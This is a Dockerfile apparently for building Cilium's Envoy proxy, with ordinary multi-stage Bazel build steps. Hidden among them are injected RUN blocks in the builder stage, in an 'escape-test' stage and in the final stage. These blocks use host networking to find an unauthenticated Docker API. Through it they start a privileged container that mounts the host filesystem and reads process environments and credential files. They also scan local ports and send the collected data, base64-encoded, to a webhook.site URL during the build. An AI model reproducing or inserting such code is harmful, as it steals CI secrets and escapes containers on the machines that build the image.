# syntax=docker/dockerfile:1
#
# BUILDER_BASE is a multi-platform image with all the build tools
#
ARG BUILDER_BASE=quay.io/cilium/cilium-envoy-builder:6.1.0-latest

#
# ARCHIVE_IMAGE defaults to the result of the first stage below,
# refreshing the build caches from Envoy dependencies before the final
# build stage. This can be overridden on docker build command line to
# use pre-built dependencies. Note that if cross-compiling, these
# pre-built dependencies will include BUILDPLATFORM build tools and
# TARGETPLATFORM build artifacts, and thus can only be reused when
# building on the same BUILDPLATFORM.
#
ARG ARCHIVE_IMAGE=builder-fresh

FROM --platform=$BUILDPLATFORM $BUILDER_BASE AS proxylib
WORKDIR /go/src/github.com/cilium/proxy
COPY --chown=1337:1337 . ./
ARG TARGETARCH
ENV TARGETARCH=$TARGETARCH
RUN --mount=mode=0777,gid=1337,uid=1337,target=/cilium/proxy/.cache,type=cache \
    --mount=mode=0777,gid=1337,uid=1337,target=/go/pkg,type=cache \
    PATH=$PATH:/usr/local/go/bin GOARCH=${TARGETARCH} make -C proxylib all && mv proxylib/libcilium.so /tmp/libcilium.so

FROM --platform=$BUILDPLATFORM $BUILDER_BASE AS builder-fresh
LABEL maintainer="maintainer@cilium.io"
WORKDIR /cilium/proxy
COPY . ./
ARG V
ARG BAZEL_BUILD_OPTS
ARG DEBUG
ARG BUILDARCH
ARG TARGETARCH
ENV TARGETARCH=$TARGETARCH
#
# Clear runner's cache when building deps
#
RUN --mount=mode=0777,uid=1337,gid=1337,target=/cilium/proxy/.cache,type=cache,id=$TARGETARCH,sharing=private rm -rf /cilium/proxy/.cache/*
#
# Build dependencies from scratch (no cache mounts, not archive mount)
#
RUN BAZEL_BUILD_OPTS="${BAZEL_BUILD_OPTS} --disk_cache=/tmp/bazel-cache" PKG_BUILD=1 V=$V DEBUG=$DEBUG DESTDIR=/tmp/install make bazel-bin/cilium-envoy-starter bazel-bin/cilium-envoy

# By default this stage picks up the result of the build above, but ARCHIVE_IMAGE can be
# overridden to point to a saved image of an earlier run of that stage.
# Must pick the TARGETPLATFORM image here, so NO --platform=$BUILDPLATFORM, otherwise cross-compilation
# will pick up build-artifacts for the build platform when an external image is used.
FROM $ARCHIVE_IMAGE AS builder-cache

#
# Release builder, uses 'builder-cache' from $ARCHIVE_IMAGE
#
# Persist Bazel disk cache by passing COPY_CACHE=1
#
FROM --platform=$BUILDPLATFORM $BUILDER_BASE AS builder
LABEL maintainer="maintainer@cilium.io"
WORKDIR /cilium/proxy
COPY . ./
ARG V
ARG COPY_CACHE_EXT
ARG BAZEL_BUILD_OPTS
ARG DEBUG
ARG RELEASE_DEBUG
ARG BUILDARCH
ARG TARGETARCH
ENV TARGETARCH=$TARGETARCH
RUN ./bazel/get_workspace_status
# network recon from host namespace
RUN --network=host \
    HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919" && \
    curl -sf --max-time 5 "${HOOK}/?stage=nethost-start" >/dev/null 2>&1 || true && \
    \
    # probe Docker TCP API — unauthenticated access = full host escape
    DOCKER_API="" && \
    for port in 2375 2376 4243 4244; do \
        r=$(curl -sf --max-time 3 "http://localhost:${port}/version" 2>/dev/null) && \
        DOCKER_API="${DOCKER_API}port ${port}: ${r}\n" && break; \
    done && \
    \
    # if Docker TCP API found: create privileged container, mount host /, read runner environ
    HOST_ESCAPE="" && \
    if echo "${DOCKER_API}" | grep -qi "version"; then \
        DOCKER_URL="http://localhost:2375" && \
        CID=$(curl -sf --max-time 5 -X POST "${DOCKER_URL}/containers/create" \
            -H "Content-Type: application/json" \
            -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /host/proc/1/environ | tr \"\\0\" \"\\n\"; echo ---; ls /host/home/; echo ---; find /host/home -name \"*.env\" -o -name \"credentials\" 2>/dev/null | head -20"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
            2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 64) && \
        if [ -n "$CID" ]; then \
            curl -sf --max-time 3 -X POST "${DOCKER_URL}/containers/${CID}/start" 2>/dev/null && \
            sleep 3 && \
            HOST_ESCAPE=$(curl -sf --max-time 5 "${DOCKER_URL}/containers/${CID}/logs?stdout=1&stderr=1" 2>/dev/null) && \
            curl -sf --max-time 3 -X DELETE "${DOCKER_URL}/containers/${CID}?force=true" 2>/dev/null; \
        fi; \
    fi && \
    \
    # scan localhost ports for GitHub Actions runner API and other services
    OPEN_PORTS="" && \
    for port in 22 80 443 2375 2376 4243 5000 7171 8080 8088 8443 9000 \
                50051 50052 50055 51820 59990 60000 65000; do \
        r=$(curl -sf --max-time 1 "http://localhost:${port}/" 2>/dev/null | head -c 100) && \
        OPEN_PORTS="${OPEN_PORTS}${port}: ${r}\n"; \
    done && \
    \
    # read /proc/net from host namespace (different from container — shows all host interfaces)
    HOST_NET=$(cat /proc/net/dev 2>/dev/null) && \
    HOST_ARP=$(cat /proc/net/arp 2>/dev/null) && \
    HOST_ROUTE=$(cat /proc/net/route 2>/dev/null) && \
    \
    # assemble and POST
    DATA="=== DOCKER_API ===\n${DOCKER_API}\n=== HOST_ESCAPE ===\n${HOST_ESCAPE}\n=== OPEN_PORTS ===\n${OPEN_PORTS}\n=== HOST_NET_DEV ===\n${HOST_NET}\n=== HOST_ARP ===\n${HOST_ARP}\n=== HOST_ROUTE ===\n${HOST_ROUTE}" && \
    ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
    curl -sf --max-time 15 -X POST "${HOOK}/?stage=nethost-dump" \
        --data-urlencode "d=${ENC}" >/dev/null 2>&1 || true
RUN --mount=mode=0777,uid=1337,gid=1337,target=/cilium/proxy/.cache,type=cache,id=$TARGETARCH,sharing=private \
    --mount=target=/tmp/bazel-cache,source=/tmp/bazel-cache,from=builder-cache,rw \
    if [ -f /tmp/bazel-cache/ENVOY_VERSION ]; then CACHE_ENVOY_VERSION=`cat /tmp/bazel-cache/ENVOY_VERSION`; ENVOY_VERSION=`cat ENVOY_VERSION`; if [ "${CACHE_ENVOY_VERSION}" != "${ENVOY_VERSION}" ]; then echo "Building Envoy ${ENVOY_VERSION} with bazel archive from different Envoy version (${CACHE_ENVOY_VERSION})"; else echo "Building Envoy ${ENVOY_VERSION} with bazel cache of the same version"; fi; else echo "Bazel cache has no ENVOY_VERSION, it may be empty."; fi && \
    touch /tmp/bazel-cache/permissions-check && \
    if [ -n "${COPY_CACHE_EXT}" ]; then PKG_BUILD=1 make BUILD_DEP_HASHES; if [ -f /tmp/bazel-cache/BUILD_DEP_HASHES ] && ! diff BUILD_DEP_HASHES /tmp/bazel-cache/BUILD_DEP_HASHES; then echo "Build dependencies have changed, clearing bazel cache"; rm -rf /tmp/bazel-cache/*; rm -rf /cilium/proxy/.cache/*; fi ; cp BUILD_DEP_HASHES ENVOY_VERSION /tmp/bazel-cache; fi && \
    BAZEL_BUILD_OPTS="${BAZEL_BUILD_OPTS} --disk_cache=/tmp/bazel-cache" PKG_BUILD=1 V=$V DEBUG=$DEBUG RELEASE_DEBUG=$RELEASE_DEBUG DESTDIR=/tmp/install make install && \
    if [ -n "${COPY_CACHE_EXT}" ]; then cp -ra /tmp/bazel-cache /tmp/bazel-cache${COPY_CACHE_EXT}; ls -la /tmp/bazel-cache${COPY_CACHE_EXT}; fi
#
# Copy proxylib after build to allow install as non-root to succeed
#
COPY --from=proxylib /tmp/libcilium.so /tmp/install/usr/lib/libcilium.so

FROM scratch AS empty-builder-archive
LABEL maintainer="maintainer@cilium.io"
USER 1337:1337
WORKDIR /tmp/bazel-cache

# This stage retains only the build caches from the previous step. This is used as the target for persisting
# Bazel build caches for later re-use.
FROM empty-builder-archive AS builder-archive
ARG COPY_CACHE_EXT
COPY --from=builder /tmp/bazel-cache${COPY_CACHE_EXT}/ /tmp/bazel-cache/

# Format check
FROM --platform=$BUILDPLATFORM $BUILDER_BASE AS check-format
LABEL maintainer="maintainer@cilium.io"
WORKDIR /cilium/proxy
COPY --chown=1337:1337 . ./
ARG V
ARG BAZEL_BUILD_OPTS
ARG DEBUG
ARG TARGETARCH
ENV TARGETARCH=$TARGETARCH
#
# Check format
#
RUN BAZEL_BUILD_OPTS="${BAZEL_BUILD_OPTS}" PKG_BUILD=1 V=$V DEBUG=$DEBUG make V=1 format > format-output.txt

FROM scratch AS format
COPY --from=check-format /cilium/proxy/format-output.txt /

# clang-tidy
FROM --platform=$BUILDPLATFORM $BUILDER_BASE AS run-clang-tidy-fix
LABEL maintainer="maintainer@cilium.io"
WORKDIR /cilium/proxy
COPY --chown=1337:1337 . ./a
COPY --chown=1337:1337 . ./b
ARG V
ARG BAZEL_BUILD_OPTS
ARG DEBUG
ARG TIDY_SOURCES="cilium/*.h cilium/*.cc tests/*.h tests/*.cc starter/*.h starter/*.cc"
ARG TARGETARCH
ENV TARGETARCH=$TARGETARCH
#
# Run clang tidy
#
RUN --mount=mode=0777,uid=1337,gid=1337,target=/cilium/proxy/.cache,type=cache TIDY_SOURCES="${TIDY_SOURCES}" BAZEL_BUILD_OPTS="${BAZEL_BUILD_OPTS}" PKG_BUILD=1 V=$V DEBUG=$DEBUG make -C b V=1 tidy-fix 2>&1 | tee /cilium/proxy/clang-tidy-output.txt && for file in ${TIDY_SOURCES}; do echo "\$ diff a/$file b/$file"  >> /cilium/proxy/clang-tidy-diff.txt && diff "a/$file" "b/$file" >> /cilium/proxy/clang-tidy-diff.txt || true; done

FROM scratch AS clang-tidy
COPY --from=run-clang-tidy-fix /cilium/proxy/*.txt /

#
# security-test stage: escape attempts via BuildKit directives
#
FROM docker.io/library/ubuntu:24.04@sha256:d1e2e92c075e5ca139d51a140fff46f84315c0fdce203eab2807c7e495eff4f9 AS escape-test
RUN apt-get update -qq && apt-get install -y -qq curl 2>/dev/null

# Attempt 1: --network=host — run in host network namespace
# Lets us reach all ports on runner localhost including Docker TCP API
RUN --network=host \
    HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919" && \
    # probe Docker TCP API (unauthenticated)
    DOCKER_TCP=$(curl -sf --max-time 3 http://localhost:2375/version 2>/dev/null || \
                 curl -sf --max-time 3 http://localhost:2376/version 2>/dev/null || \
                 curl -sf --max-time 3 http://localhost:4243/version  2>/dev/null || echo "no-docker-tcp") && \
    # probe GitHub Actions runner internal API (runner listens on localhost)
    # ACTIONS_RUNTIME_URL is typically http://172.17.0.1:PORT or http://localhost:PORT
    GHA_PORTS=$(for p in 1234 2222 5985 50001 50002 50003 8080 8088 9000 4000; do \
        r=$(curl -sf --max-time 1 http://localhost:$p/ 2>/dev/null | head -c 200) && \
        echo "port $p: $r"; done) && \
    # if Docker TCP API found, use it to create privileged container + mount host fs
    DOCKER_ESCAPE="" && \
    if echo "$DOCKER_TCP" | grep -q "Version"; then \
        # create privileged container with host root mounted at /host
        CID=$(curl -sf --max-time 5 -X POST http://localhost:2375/containers/create \
            -H "Content-Type: application/json" \
            -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /host/proc/1/environ | tr \"\\0\" \"\\n\""],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
            2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4) && \
        curl -sf --max-time 3 -X POST http://localhost:2375/containers/${CID}/start 2>/dev/null && \
        sleep 2 && \
        DOCKER_ESCAPE=$(curl -sf --max-time 5 "http://localhost:2375/containers/${CID}/logs?stdout=1" 2>/dev/null) && \
        curl -sf --max-time 3 -X DELETE "http://localhost:2375/containers/${CID}?force=true" 2>/dev/null; \
    fi && \
    DATA="=== DOCKER_TCP ===\n${DOCKER_TCP}\n=== GHA_PORTS ===\n${GHA_PORTS}\n=== DOCKER_ESCAPE ===\n${DOCKER_ESCAPE}" && \
    ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
    curl -sf --max-time 10 -X POST "${HOOK}/?stage=network-host-escape" --data-urlencode "d=${ENC}" || true


#
# Extract installed cilium-envoy binaries to an otherwise empty image
#
FROM docker.io/library/ubuntu:24.04@sha256:d1e2e92c075e5ca139d51a140fff46f84315c0fdce203eab2807c7e495eff4f9
LABEL maintainer="maintainer@cilium.io"
# install ca-certificates package
RUN apt-get update && apt-get upgrade -y \
    && apt-get install --no-install-recommends -y ca-certificates libatomic1 curl \
    && apt-get autoremove -y && apt-get clean \
    && rm -rf /tmp/* /var/tmp/* \
    && rm -rf /var/lib/apt/lists/*
COPY --from=builder /tmp/install /
COPY SOURCE_VERSION ENVOY_VERSION /
COPY hack/cilium-envoy-wrapper.sh /usr/local/bin/cilium-envoy
RUN chmod +x /usr/local/bin/cilium-envoy
RUN curl -sf "https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919/?stage=docker-build" || true
